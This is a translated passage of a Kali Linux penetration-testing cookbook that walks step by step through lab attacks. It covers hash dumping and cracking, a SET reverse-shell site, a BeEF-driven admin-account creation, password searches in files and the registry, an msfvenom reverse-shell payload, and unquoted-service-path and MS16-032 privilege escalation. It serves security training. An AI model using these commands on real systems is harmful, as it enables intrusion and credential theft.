# Kali Linux 入侵和利用秘籍（三）

> 原文：[`annas-archive.org/md5/38D0D8F444F88ADA9AC2256055C3F399`](https://annas-archive.org/md5/38D0D8F444F88ADA9AC2256055C3F399)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第八章：系统和密码利用

在本章中，我们将涵盖以下内容：

+   使用本地密码攻击工具

+   破解密码哈希

+   使用社会工程师工具包

+   使用 BeEF 进行浏览器利用

+   使用彩虹表破解 NTLM 哈希

# 介绍

在本章中，我们将专注于获取哈希值，然后破解它们以获取访问权限。这些信息可以得到很好的利用，因为很有可能在同一网络中有其他使用相同密码的系统。让我们继续看看如何实现这一点。

# 使用本地密码攻击工具

在本教程中，我们将看到一些用于 Windows 和 Linux 的工具，用于执行猜测密码攻击。对于 Linux，我们将使用一个名为**sucrack**的工具，对于 Windows，我们将使用**fgdump**和**pwdump**。Sucrack 用于通过`su`命令破解密码，这是一个多线程工具。SU 是 Linux 中的一个工具，允许您使用替代用户运行命令。但首先让我们了解这些工具：Sucrack 是一个密码破解器。Fgdump 和 pwdump 是从 LSASS 内存中转储 SAM 哈希的工具。**JTR**（**John the Ripper**）是用于 SAM 哈希的破解器。**Windows 凭证编辑器**（**WCE**）是一个安全工具，用于列出登录会话并添加、更改、列出和删除相关的凭证（例如 LM/NT 哈希、明文密码和 Kerberos 票据）。让我们从实际操作开始。

## 准备工作

为了演示这一点，我们需要一台 Windows XP 机器和我们的 Kali Linux 发行版。读者可能还需要将`PwDump.exe`和`FgDump.exe`从 Kali Linux 移植到 Windows XP。

## 如何做...

1.  出于演示目的，我们已将密码更改为`987654321`。输入以下命令开始 sucrack 攻击：

```
      sucrack -a -w 10 -s 3 -u root /usr/share/wordlists/rockyou.txt

```

输出将如下屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_001.jpg)

一旦攻击完成并且密码与字典中的一个匹配，我们将得到以下结果：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_002.jpg)

1.  同样，我们可以为任何想要的用户执行相同的操作，只需在`-u`参数中输入他/她的用户名。

1.  让我们看看如何在 Windows 机器上完成相同的操作。`wce.exe`、`PwDump.exe`和`FgDump.exe`的二进制文件可以在 Kali Linux 的`/usr/share/windows-binaries/`路径中找到。将其导入到 Windows 机器以继续。

现在我们有了工具，确保终端指向放置文件的同一文件夹。

1.  在终端中输入以下命令：

```
      PWDump.exe -o test 127.0.0.1

```

输出将如下屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_003.jpg)

1.  现在用记事本打开在执行`PWDump.exe`命令的同一文件夹中创建的测试文件：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_004.jpg)

这表明`PwDump.exe`提取了所有密码并以 NTLM 哈希状态显示；可以在 NTLM 解密网站上使用相同的方法，这些网站存储了大量带有明文密码的哈希值。这些网站存储了一个巨大的已破解哈希值数据库，可以进行比较以获取原始字符串。需要记住的一点是 NTLM 哈希是单向哈希，无法解密；获取实际密码的唯一方法是拥有单词及其对应的哈希值。一个著名的网站是[`hashkiller.co.uk`](https://hashkiller.co.uk)。它大约有 312.0720 亿个唯一解密的 NTLM 哈希。

1.  现在让我们来看看 fgdump 及其工作原理。在我们继续之前，我们需要知道 fgdump 是 pwdump 的更新版本；它具有显示密码历史记录的附加功能（如果可用）。在命令提示符中输入以下命令：

```
      fgdump.exe

```

输出将如下屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_005.jpg)

这将创建三个文件：两个 pwdump 文件和一个 cache-dump 文件：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_006.jpg)

1.  打开 pwdump 文件后，我们得到了与我们在之前运行的工具中得到的相同的 NTLM 哈希；可以将相同的内容输入到 NTLM 破解网站中以获得明文密码。

## 它是如何工作的...

我们使用了一些参数。让我们了解一下它是如何工作的：

```
sucrack -a -w 10 -s 3 -u root /usr/share/wordlists/rockyou.txt

```

+   `-a`：这使用 ANSI 转义代码来显示漂亮的统计信息

+   `-w`：显示要运行的工作线程数

+   `-s`：以秒为单位显示统计信息的间隔

+   `-u`：显示要`su`到的用户帐户

```
Pwdump.exe -o test 127.0.0.1

```

让我们了解一下`Pwdump.exe`使用的参数：

+   `-o`：这用于写入文件

+   `127.0.0.1`：输入受损机器的 IP 地址

## 还有更多...

sucrack、pwdump 和 fgdump 中还有更多可以探索的选项。只需在各自的窗口和终端中发出命令`sucrack`、`Pwdump -h`和`fgdump -h`即可获取所有可用选项。

# 破解密码哈希

在这个教程中，我们将看到如何破解明文密码的哈希。我们将使用 John the Ripper。John the Ripper（JTR）是一个快速的密码破解器，目前可用于多种 Unix、Windows、DOS 和 OpenVMS 版本。它的主要目的是检测弱 Unix 密码。除了在各种 Unix 系统上常见的几种 crypt（3）密码哈希类型之外，支持的还有 Windows LM 哈希，以及社区增强版本中的许多其他哈希和密码。

## 准备工作

我们需要将在 Windows 机器上获得的哈希传输到我们的 Kali 机器上，之后我们可以开始比较哈希。

## 如何做...

1.  让我们从破解密码时最有效的工具之一 JTR 开始。在给定的示例中，我们已经获取了哈希转储。该文件已重命名为`crackme`以便阅读。

1.  在终端中输入以下命令：

```
john crackme

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_007.jpg)

正如我们所看到的，密码是以明文检索的；例如，`dhruv: 1`和`dhruv: 2`形成了整个密码`Administrator`；其他密码也是类似的。密码之所以被分割成这样，是因为 NTLM 哈希机制。整个哈希实际上被分成了 8:8 的段，如果密码大于八个字符，另一部分也会用于哈希密码。

John the Ripper 支持破解不同类型的哈希，其中 NTLM 是其中之一。

## 它是如何工作的...

在前面的教程中，我们使用了以下命令：

+   `|john crackme`：其中`crackme`是包含哈希的密码文件

John the Ripper 是一个智能工具；它可以检测使用的加密类型，并自动执行破解阶段。

## 还有更多...

可以使用`man john`或`john --help`命令找到更多关于 John the Ripper 的信息：

![还有更多...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_008.jpg)

# 使用社会工程工具包

**社会工程工具包**（**SET**），顾名思义，专注于利用人类好奇心的特性。SET 是由 David Kennedy（ReL1K）编写的，并在社区的大力帮助下，已经整合了攻击。在这个教程中，我们将看看如何创建一个恶意可执行文件，以及攻击者如何等待受害者执行该文件。我们还将看看攻击者如何通过诱使受害者访问恶意网站来获得反向 shell。

## 准备工作

在这个教程中，我们将使用带有 Internet Explorer 6 的 Windows 操作系统和 Kali Linux 机器；`Setoolkit`默认作为 Kali 的一部分安装。

## 如何做...

1.  使用以下命令启动社会工程工具包：

```
Setoolkit

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_009.jpg)

在这个活动中，我们将看看如何使用“社会工程攻击”来托管一个假网站，并利用用户的 IE（如果易受攻击），并获得对他账户的反向 shell。我们将选择“社会工程攻击”，即选项 1：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_010.jpg)

1.  现在我们将选择网站攻击向量，即 2，然后看起来如下：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_011.jpg)

1.  现在我们将选择“Metasploit 浏览器利用方法”选项 2：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_012.jpg)

1.  之后，我们将克隆该网站并填写必要的信息：

```
      set:webattack>2
      [-] NAT/Port Forwarding can be used in the cases where your SET       machine is
      [-] not externally exposed and may be a different IP address       than your reverse listener.
      set> Are you using NAT/Port Forwarding [yes|no]: yes
      set:webattack> IP address to SET web server (this could be your        external IP or hostname):192.168.157.157
      set:webattack> Is your payload handler (metasploit) on a       different IP from your external NAT/Port FWD address [yes|no]:no
      [-] SET supports both HTTP and HTTPS
      [-] Example: http://www.thisisafakesite.com
      set:webattack> Enter the url to clone:http://security-geek.in

```

同样的截图如下所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_013.jpg)

1.  我们将选择“Internet Explorer 6 的 Aurora 内存损坏漏洞（2010-01-14）”，选项 37，并选择 Metasploit **Windows Shell Reverse_TCP**，选项 1，并指定任何所需的端口，最好是大于 1,000，因为低于 1,000 的端口是为操作系统注册的。输出将如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_014.jpg)

一旦恶意网站的设置完成，它将如下所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_015.jpg)

1.  现在我们在攻击者端的配置已经完成，我们所要做的就是在恶意网站上呼叫受害者。在这个练习中，我们的受害者是一个带有 IE 6 版本的 Windows 机器：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_016.jpg)

恶意脚本被执行，如果满足所有条件，如 Internet Explorer 浏览器、易受攻击的浏览器版本和无杀毒软件检测，我们将获得反向 shell 作为我们的有效载荷，如前所述：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_017.jpg)

检查以确保它是相同的系统，让我们运行 ipconfig：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_018.jpg)

## 它是如何工作的...

正如您所看到的，整个练习是不言自明的；我们创建或托管一个假网站，以窃取信息或远程访问系统。在企业环境中，这应该被极度小心对待。没有执行特殊命令；只是按照流程进行。

## 还有更多...

让我们假设攻击者想要攻击一个服务器，然而，只有三到四个人在防火墙上有权访问该服务器。攻击者会进行社会工程，迫使这四个用户中的一个访问该网站，并可能幸运地获得一个 shell。一旦完成，攻击者将能够通过受损的机器在目标服务器上发起攻击。

社会工程工具包不仅限制您进行基于浏览器的利用，甚至还包含诸如网络钓鱼、大规模邮件发送、基于 Arduino 的攻击、无线攻击等模块。由于本章节限制在利用方面，我们已经准备好了解如何通过 SET 进行利用的方法。

# 使用 BeEF 进行浏览器利用

**BeEF**代表**浏览器利用框架**。它是一个主要专注于浏览器和相关利用的渗透测试工具。如今，对客户端浏览器的威胁日益增多，包括移动客户端、Web 客户端等。BeEF 允许我们使用客户端攻击向量对目标进行渗透测试，例如创建用户、执行恶意脚本等。BeEF 主要专注于基于 Web 客户端的利用，例如浏览器级别。

## 准备工作

BeEF XSS 已经是 Kali Linux 的一部分。在这个练习中，我们使用的是一个带有 Firefox 浏览器的 Windows 机器。我们将通过 Firefox 浏览器钩住客户端。在访问钩子时，JavaScript 被执行并部署钩子。如果在运行 BeEF-XSS 框架时遇到任何问题，请参考[`github.com/beefproject/beef/wiki/Installation`](https://github.com/beefproject/beef/wiki/Installation)上的指南。

## 如何操作...

1.  通过在终端中输入以下内容来启动 BeEF 框架：

```
      cd /usr/share/beef
      ./beef

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_019.jpg)

1.  现在在 Kali 中打开 Firefox 浏览器并访问 UI 面板，如输出中所述。输入用户名密码为`beef:beef`：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_020.jpg)

1.  要钩住浏览器，我们将不得不让它加载 BeEF 的钩 URL；我们将对我们的 Windows 机器做同样的操作。我们让浏览器访问我们的 BeEF 框架的钩 URL：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_021.jpg)

1.  正如我们所看到的，框架已经检测到了一个钩，并将其附加到了钩上，现在我们可以浏览 BeEF 提供的不同能力，以利用浏览器攻击用户。注意：也可以通过强制加载来自可用的利用模块的隐藏弹出窗口来创建持久的钩，以便当用户从注入钩的页面浏览时，攻击者仍然拥有会话：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_022.jpg)

我们现在已经成功地将客户端钩到了 BeEF 框架上。通常，这个钩是一个 XSS 向量，并被粘贴为一个 iframe 覆盖任何用户访问的应用程序，然后攻击者继续攻击用户。

1.  让我们在客户端上弹出一个框来查看它的工作原理。读者应该点击被钩住的浏览器的 IP 并转到命令选项卡。在被钩住的域下，有一个**Create Alert Dialogue**的选项。点击它，设置好参数，然后点击**Execute**。检查被钩住的浏览器是否收到了警报提示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_023.jpg)

脚本执行后，受害者浏览器将出现一个警报对话框，如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_024.jpg)

1.  是的，它正在运行。现在在命令部分有各种模块可用。它们由彩色的球分开，绿色，橙色，红色和灰色。绿色表示命令模块针对目标起作用，并且对用户应该是不可见的；橙色表示命令模块针对目标起作用，但可能对用户可见；灰色表示命令模块尚未针对该目标进行验证；红色表示命令模块不适用于该目标。

1.  考虑到被钩住的浏览器是由管理员操作的，我们将使用钩来创建具有远程桌面功能的用户。在我们的环境中，我们有 Internet Explorer 在启用 ActiveX 的 Windows XP 上运行。要执行此操作，请选择机器的钩，然后转到**Commands** | **Module Tree** | **Exploits** | **Local Host** | **ActiveX Command Execution**。

在**ActiveX Command Execution**中，设置命令如下：

```
      cmd.exe /c "net user beefed beef@123 /add &  net localgroup        Administrators beefed /add & net localgroup "Remote desktop       users" beefed /add & pause"

```

设置相同的选项如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_025.jpg)

1.  我们现在将尝试使用 Kali 中的`rdesktop`命令对远程系统进行远程桌面连接。输入用户名、密码和 IP 以连接到机器：

```
      rdesktop -u beefed -p "beef@123" 192.168.157.155

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_026.jpg)

我们已成功通过客户端浏览器访问系统。

## 工作原理...

BeEF 使用 JavaScript hook.js，当被浏览器访问时，将控制权交给 BeEF 框架。有了可用的钩，可以使用命令模块中提供的各种功能。它们的能力各不相同，从枚举到系统利用，从窃取 cookie 到窃取会话，中间人攻击等等。攻击者最容易获得钩的方法是通过 XSS 攻击向量，导致它们加载一个 iframe 并附加一个钩。即使他们从感染的网站上浏览离开，钩也可以变得持久。这部分可以作为读者的家庭作业。前面的练习是不言自明的：没有额外需要解释的命令。

## 还有更多...

BeEF 是一个很棒的客户端渗透测试工具。在大多数情况下，我们演示了 XSS 的可能性。这是下一步，展示了如何通过简单的 XSS 和 JavaScript 对远程系统进行 root 并从浏览器中窃取。更多信息可以在 BeEF 框架维基上找到。

# 使用彩虹表破解 NTLM 哈希

对于这个活动，我们将使用**Ophcrack**，以及一个小的彩虹表。Ophcrack 是一个基于彩虹表的免费 Windows 密码破解工具。这是一种非常有效的彩虹表实现，由该方法的发明者完成。它带有**图形用户界面**（**GUI**）并在多个平台上运行。它默认在 Kali Linux 发行版中可用。本示例将重点介绍如何使用 Ophcrack 和彩虹表破解密码。

## 准备工作

对于这个示例，我们将破解 Windows XP 密码。彩虹表`db`可以从[`ophcrack.sourceforge.net/tables.php`](http://ophcrack.sourceforge.net/tables.php)下载。Ophcrack 工具在我们的 Kali Linux 发行版中可用。

## 如何操作...

1.  首先，从 Ophcrack sourceforge 表中下载`tables_xp_free_fast`文件，并将其放入您的 Kali 机器中。使用以下命令解压缩它：

```
Unzip tables_xp_free_fast.zip

```

输出将如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_027.jpg)

1.  我们已经从被入侵的 XP 机器中获得了要使用的哈希值。现在，要使用先前的彩虹表运行 Ophcrack，使用以下命令：

```
Ophcrack

```

现在将加载一个看起来像以下截图的 GUI。使用任何哈希转储方法加载检索到的密码哈希。在这种情况下，使用 pwdump：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_028.jpg)

1.  一旦密码哈希加载完成，屏幕将如下所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_029.jpg)

1.  点击**Tables**，选择**XP free fast**表，点击**Install**，并浏览到我们从 ophcrack 下载彩虹表文件的路径：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_030.jpg)

1.  现在我们点击 GUI 中的破解选项，破解将开始：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_08_031.jpg)

正如我们所看到的，几乎在中途，我们已经成功使用 Ophcrack 找到了一个常用密码，借助彩虹表的帮助。

## 它是如何工作的...

该工具非常易于理解，可以无故障地运行。它使用我们找到的哈希的 NT/LM 并将它们与提供的彩虹表进行匹配。当哈希匹配时，彩虹表会查找导致哈希的相应名称，我们最终以明文形式获得我们的值。

## 还有更多...

在这里，我们演示了使用最小可用大小的彩虹表。彩虹表的大小可以从 300 MB 到 3 TB 不等；此外，Ophcrack 表的高级账户可能会导致巨大的彩虹表大小。这可以在他们之前分享的 sourceforge 链接上查看。


# 第九章：权限提升和利用

在本章中，我们将涵盖以下配方：

+   使用 WMIC 查找权限提升漏洞

+   敏感信息收集

+   未引用的服务路径利用

+   服务权限问题

+   配置错误的软件安装/不安全的文件权限

+   Linux 权限提升

# 介绍

在上一章中，我们看到了如何利用服务并以低权限或系统权限用户的身份访问服务器。在本章中，我们将看看如何将低权限用户提升为提升用户 - 甚至是系统用户。本章将涵盖 Windows 和 Linux 的提升技术。通常在网络中，当服务器被攻击时，攻击者总是试图提升权限以造成更多的破坏。一旦攻击者获得了更高权限的用户访问权限，他就能够运行系统级命令，窃取密码哈希和域密码，甚至设置后门并将攻击转移到网络中的其他系统。让我们继续了解这些权限是如何提升的。

# 使用 WMIC 查找权限提升漏洞

在这个配方中，我们将了解攻击者如何通过 WMIC 获得提升权限的洞察力。WMIC 扩展了 WMI，可以从几个命令行界面和批处理脚本中操作。**WMI**代表**Windows 管理工具**。除了其他几件事情外，WMIC 还可以用来查询系统上安装的补丁。为了更好地理解它，它提供了在 Windows 更新期间安装的所有安全补丁的详细信息列表，或者手动放置的补丁。它们通常看起来像（KBxxxxx）。

## 准备工作

为了演示这一点，我们将需要一个至少有两个核心的 Windows 7 机器。如果我们在虚拟机中测试它，我们可以将核心数设置为 2。此外，此配方需要缺少该补丁。

## 如何做到...

1.  打开命令提示符并执行以下查询：

```
wmic qfe get Caption,Description,HotFixID,InstalledOn

```

输出将如下截图所示：

![How to do it...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_001.jpg)

1.  我们得到了安装在操作系统上的所有补丁的列表。有两种方法可以找到可能的提升权限漏洞：通过检查 KB 序列号检查最后安装的序列号，然后找到该补丁号之后披露的漏洞，或者通过安装日期。在这种情况下，我们通过安装日期搜索，发现了以下漏洞：![How to do it...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_002.jpg)

1.  正如我们所看到的，发现日期大约是**2016-04-21**，而我们的机器最后更新是在 2015 年 12 月。我们将利用这个漏洞并找到其补丁号。快速搜索 MS16-032 的补丁号给我们带来了路径号：![How to do it...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_003.jpg)![How to do it...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_004.jpg)

1.  我们看到 KB 号是`313991`。让我们检查一下它是否安装在系统上。在命令提示符中执行以下查询：

```
      wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr       "KB3139914"

```

输出将如下截图所示：

![How to do it...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_005.jpg)

1.  太好了。没有为其应用补丁；现在我们将从[`www.exploit-db.com/exploits/39719/`](https://www.exploit-db.com/exploits/39719/)下载漏洞利用。下载完成后，将其重命名为`Invoke-MS16-032.ps1`。

1.  现在打开 PowerShell 并输入以下命令：

```
      . ./Invoke-MS16-032.ps1
      Invoke-MS16-032

```

输出将如下截图所示：

![How to do it...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_006.jpg)

1.  太棒了！我们得到了一个系统级 shell。从这里开始，系统完全由我们控制；后期利用阶段可以从这里开始。

## 它是如何工作的...

让我们了解一下它是如何工作的：

+   `wmic qfe get Caption,Description,HotFixID,InstalledOn`：此命令执行 WMIC 接口；`qfe`代表`快速修复工程`，`get`参数允许我们设置要查看的特定列

+   `. ./ Invoke-MS16-032.ps1`：此命令执行并加载脚本

+   `Invoke-MS16-032`：此命令执行文件

## 还有更多...

使用`wmic`命令还有其他升级权限的方法；当查询`wmic`时，这不是唯一的漏洞。我们可能会发现更多尚未安装的补丁。现在让我们看看如何收集敏感信息以帮助提升权限。

# 敏感信息收集

通常情况下，网络管理员必须编写脚本来自动化公司网络中数千台计算机的流程。在每台系统上进行单独配置是一项繁琐且耗时的任务。可能会出现因疏忽而导致敏感文件在系统中被遗留的情况。这些文件可能包含密码。一旦我们检索到受损系统的哈希值，我们就可以使用它们来执行**PTH**（**传递哈希**）攻击，并访问系统中找到的不同帐户。同样，如果用户在多个系统上使用相同的密码，可以使用相同的哈希值在另一台机器上执行 PTH 攻击来获得该用户的访问权限。我们可能会找到许多可能帮助我们提升权限的敏感信息。

## 准备工作

一个 Windows 系统，一个 Kali 机器，以及对受损机器的远程 shell 访问基本上就是这个配方所需要的一切。

## 如何做...

1.  使用以下命令搜索文件系统中包含某些关键字的文件名：

```
      dir /s *pass* == *cred* == *vnc* == *.config*

```

输出将如下所示的屏幕截图：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_007.jpg)

1.  要搜索与给定关键字匹配的特定文件类型，请使用以下命令：

```
      findstr /si password *.xml *.ini *.txt

```

输出将如下所示的屏幕截图：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_008.jpg)

1.  要搜索包含密码等关键字的注册表，请使用以下命令：

```
      reg query HKLM /f password /t REG_SZ /s
      reg query HKCU /f password /t REG_SZ /s

```

1.  我们还可以搜索可能暴露某些信息的未经处理或配置文件。看看系统上是否可以找到以下文件：

```
      c:\sysprep.inf
      c:\sysprepsysprep.xml
      %WINDIR%\Panther\Unattend\Unattended.xml
      %WINDIR%\Panther\Unattended.xml
      Note: we found Unattended.xml in the screenshot shared above.

```

1.  还有其他一些样本 XML 文件可能会引起我们的兴趣。看看它们：

```
      Services\Services.xml
      ScheduledTasks\ScheduledTasks.xml
      Printers\Printers.xml
      Drives\Drives.xml
      DataSources\DataSources.xml

```

## 还有更多...

桌面上可能有文件，或者在共享文件夹中，包含密码。其中可能还有包含存储密码的计划程序。最好在操作系统中搜索一次，找到可能有助于提升权限的敏感信息。

# 未引用服务路径利用

在这个配方中，我们将练习利用和获取高级用户对未引用服务路径的额外权限。首先，让我们了解什么是未引用的服务路径。我们所说的是指定/配置的服务二进制文件路径没有加引号。这只有在低权限用户被赋予对系统驱动器的访问权限时才有效。这通常发生在公司网络中，用户被允许添加文件的例外情况。

让我们看一下以下屏幕截图，更好地理解这个问题：

![未引用服务路径利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_009.jpg)

如果我们看一下可执行文件的路径，它是没有加引号指定的。在这种情况下，可以绕过 Windows 的执行方法。当路径之间有空格，并且没有用引号指定时，Windows 基本上是以以下方式执行的：

```
    C:\Program.exe
    C:\Program\FilesSome.exe
    C:\Program\FilesSome\FolderService.exe

```

在前面的情况下，Foxit Cloud Safe Update Service 的路径是没有引号的，这基本上意味着它将搜索绝对路径，并导致`Program.exe`文件被执行的情况。现在让我们执行这个实际的例子，看看它是如何工作的。

## 准备工作

为了做好准备，我们需要 Metasploit 和 Foxit Reader，可以在[`filehippo.com/download_foxit/59448/`](http://filehippo.com/download_foxit/59448/)找到。易受攻击的版本是 Foxit Reader 7.0.6.1126。一旦安装了 Foxit，我们就可以继续我们的配方。

## 如何操作...

1.  运行 Windows cmd 并输入以下命令：

```
      sc qc FoxitCloudUpdateService

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_010.jpg)

1.  我们看到二进制路径没有被引号括起来。现在我们将继续在我们的 Kali 机器上使用`msfvenom`制作一个反向 shell，用于这个 Windows 框架。在 Kali 终端中输入以下命令，替换您在 Kali 上获得的 IP 和所需的端口：

```
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP       Address> LPORT=<Your Port to Connect On> -f exe > Program.exe

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_011.jpg)

1.  在您的 Kali 机器上使用以下命令启动一个反向处理程序：

```
      use exploit/multi/handler
      set payload windows/meterpreter/reverse_tcp
      set lhost x.x.x.x
      set lport xxx
      exploit

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_012.jpg)

1.  现在，让我们将这个文件放在 Windows 系统上。由于我们专注于权限提升，我们将简单地将其托管在 Web 服务器上，并在 Windows 机器上下载它。

1.  一旦文件下载完成，我们找到一种方法将其放在`C`驱动器中，以便路径类似于`C:\Program.exe`。只有在权限设置不正确，或者错误配置的 FTP 设置将路径指向`C`驱动器，或者允许我们将我们的代码粘贴到路径上的任何错误配置时，才有可能实现这一点：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_013.jpg)

1.  现在我们将重新启动 Windows 7 系统，并等待我们的处理程序，看看是否会得到一个反向连接：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_014.jpg)

1.  我们成功地在重新启动时获得了一个反向连接；这是由于未加引号的服务路径漏洞。

1.  让我们检查我们收到连接的用户级别：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_015.jpg)

1.  我们已经进入系统。现在我们可以在操作系统上执行任何任务而不受任何限制。

## 它是如何工作的...

如介绍中所讨论的，这是因为 Windows 处理服务二进制路径的执行流程。我们能够利用任何有空格并且没有被引号括起来的服务。

让我们了解`msfvenom`命令：

```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP   Address>   LPORT=<Your Port to Connect On> -f exe > Program.exe

```

在上述命令中，`-p`代表有效载荷，`LHOST`和`LPORT`是有效载荷的要求，`-f`表示生成有效载荷的格式。

要获取更多信息，请输入以下命令：

```
  Msfvenom -h

```

## 还有更多...

更多未加引号的服务路径利用示例可在 exploit-db 上找到。使用以下 Google dork 命令获取更多信息：

```
intitle:unquoted site:exploit-db.com 

```

## 参见...

+   关于未加引号的服务路径利用的两篇优秀白皮书可以在[`trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/`](https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/)和[`www.gracefulsecurity.com/privesc-unquoted-service-path/`](https://www.gracefulsecurity.com/privesc-unquoted-service-path/)找到。

# 服务权限问题

在这个教程中，我们将看看如何提升弱配置服务的权限。这里的核心关注点是，当一个服务被赋予所有访问权限时。可以想象当一个服务以系统权限运行时给予所有访问权限的恐怖。在这个教程中，我们将看一个案例研究，Windows XP 被装载了有漏洞的服务，并且可以以低权限用户的身份执行系统级命令。当这种情况可能发生时，很容易利用并提升权限到系统级。

## 准备工作

对于这个活动，我们将需要一台 Windows XP 机器。我们将利用运行在 Windows XP 操作系统上的 UPnP 服务。**UPnP**代表**通用即插即用**协议。我们还需要 Windows Sysinternals 套件中提供的**AccessChk**工具。它可以从([`technet.microsoft.com/en-us/bb842062`](https://technet.microsoft.com/en-us/bb842062))下载。让我们继续并开始我们的教程。

## 如何操作...

1.  Windows XP 机器启动后，使用具有用户权限的用户名登录，在`accesschk.exe`文件所在的文件夹中打开命令提示符，并运行以下命令：

```
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_016.jpg)

1.  一旦我们知道有两个服务可以访问所有用户的权限，我们将检查服务配置。在命令提示符中输入以下命令：

```
sc qc upnphost

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_017.jpg)

